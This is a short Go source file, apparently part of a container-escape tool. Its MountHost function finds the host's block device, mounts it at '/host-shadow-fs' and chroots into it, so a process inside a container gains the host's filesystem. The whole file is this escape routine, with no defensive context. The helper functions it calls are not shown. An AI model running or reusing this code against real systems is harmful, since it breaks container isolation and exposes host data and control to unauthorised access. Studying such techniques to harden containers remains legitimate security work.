package mountEscape

var DefaultMountPath = "/host-shadow-fs"

func MountHost() error {
	deviceList, err := GetDeviceList()
	if err != nil {
		return err
	}
	mountInfo, fsType, err := GetMountInfo()
	if err != nil {
		return err
	}
	var hostDevice string
	for _, data := range deviceList {
		if mountInfo == data[0] {
			hostDevice = data[1]
			break
		}
	}

	if err := Mkdir(DefaultMountPath); err != nil {
		return err
	}
	defer RemoveDir(DefaultMountPath)

	if err := DoMount("/dev/"+hostDevice, DefaultMountPath, fsType); err != nil {
		return err
	}
	defer Umount(DefaultMountPath)

	if err := Chroot(DefaultMountPath); err != nil {
		return err
	}

	return nil
}
